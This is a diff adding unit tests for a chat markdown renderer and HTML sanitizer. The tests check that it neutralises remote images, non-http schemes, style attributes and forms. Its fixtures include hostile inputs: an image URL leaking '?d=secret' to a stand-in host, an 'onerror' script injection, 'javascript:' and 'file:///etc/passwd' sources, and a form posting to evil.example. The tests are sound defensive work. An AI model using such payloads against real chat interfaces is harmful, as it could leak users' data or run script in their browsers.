@@ -41,6 +41,85 @@ describe('renderChatMarkdown', () => {
     })
     expect(html).toContain('data-document-path="docs/x.md"')
   })
+
+  /** The only link of a rendered fragment, as the attributes that matter. */
+  function onlyLink(html: string) {
+    const root = document.createElement('div')
+    root.innerHTML = html
+    expect(root.querySelector('img')).toBeNull()
+    const links = root.querySelectorAll('a')
+    expect(links).toHaveLength(1)
+    const a = links[0]
+    return { href: a.getAttribute('href'), target: a.target, rel: a.rel, text: a.textContent }
+  }
+  const external = { target: '_blank', rel: 'noopener noreferrer nofollow' }
+
+  it('replaces a remote markdown image with a safe link labelled by its alt text', async () => {
+    const { renderChatMarkdown } = await import('../utils/render-chat-markdown')
+    const html = renderChatMarkdown('![Build chart](https://evil.example/p.png?d=secret)')
+    expect(onlyLink(html)).toEqual({ href: 'https://evil.example/p.png?d=secret', text: 'Build chart', ...external })
+  })
+
+  it.each([
+    ['<img src="//evil.example/p.png">', `${window.location.protocol}//evil.example/p.png`],
+    ['<img src="http://evil.example/p.png">', 'http://evil.example/p.png'],
+  ])('labels the link with the URL when the remote image has no alt: %s', async (raw, url) => {
+    const { renderChatMarkdown, sanitizeChatHtml } = await import('../utils/render-chat-markdown')
+    expect(onlyLink(renderChatMarkdown(raw))).toEqual({ href: url, text: url, ...external })
+    expect(onlyLink(sanitizeChatHtml(raw))).toEqual({ href: url, text: url, ...external })
+  })
+
+  it('does not let the alt text of a remote image inject markup', async () => {
+    const { sanitizeChatHtml } = await import('../utils/render-chat-markdown')
+    const html = sanitizeChatHtml('<img src="https://evil.example/p.png" alt="&lt;img src=x onerror=alert(1)&gt;">')
+    expect(html).not.toContain('<img')
+    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;</a>')
+  })
+
+  it('replaces a remote image already wrapped in a link with its alt text, without nesting links', async () => {
+    const { renderChatMarkdown } = await import('../utils/render-chat-markdown')
+    const html = renderChatMarkdown('[![Badge](https://evil.example/b.svg)](https://example.com/ci)')
+    expect(html).not.toContain('evil.example')
+    expect(onlyLink(html)).toEqual({ href: 'https://example.com/ci', text: 'Badge', ...external })
+  })
+
+  it.each(['file:///etc/passwd', 'ftp://evil.example/p.png', 'javascript:alert(1)'])(
+    'never links nor loads a remote image with a non-http(s) scheme: %s',
+    async (src) => {
+      const { sanitizeChatHtml } = await import('../utils/render-chat-markdown')
+      const html = sanitizeChatHtml(`<img src="${src}" alt="x">`)
+      expect(html).not.toContain('src=')
+      expect(html).not.toContain('<a')
+    },
+  )
+
+  it('drops a remote srcset while keeping the local image', async () => {
+    const { sanitizeChatHtml } = await import('../utils/render-chat-markdown')
+    const html = sanitizeChatHtml('<img srcset="https://evil.example/p.png 2x" src="/ok.png">')
+    expect(html).toContain('<img')
+    expect(html).not.toContain('evil.example')
+  })
+
+  it.each([
+    '/api/workspaces/w1/images/file?path=.ai%2Fimages%2Fa.png',
+    'images/a.png',
+    'data:image/png;base64,AAAA',
+    'blob:http://localhost/abc',
+    `${window.location.origin}/icons/a.png`,
+  ])('keeps same-origin, relative, data: and blob: images: %s', async (src) => {
+    const { sanitizeChatHtml } = await import('../utils/render-chat-markdown')
+    expect(sanitizeChatHtml(`<img src="${src}">`)).toContain('<img')
+  })
+
+  it('strips style attributes, <style> and <form>', async () => {
+    const { renderChatMarkdown } = await import('../utils/render-chat-markdown')
+    const html = renderChatMarkdown(
+      '<p style="background:url(https://evil.example/x)">a</p><style>p{color:red}</style><form action="https://evil.example"><input name="q"></form>',
+    )
+    expect(html).not.toContain('style')
+    expect(html).not.toContain('<form')
+    expect(html).not.toContain('evil.example')
+  })
 })
 
 describe('renderChatMarkdownCached', () => {
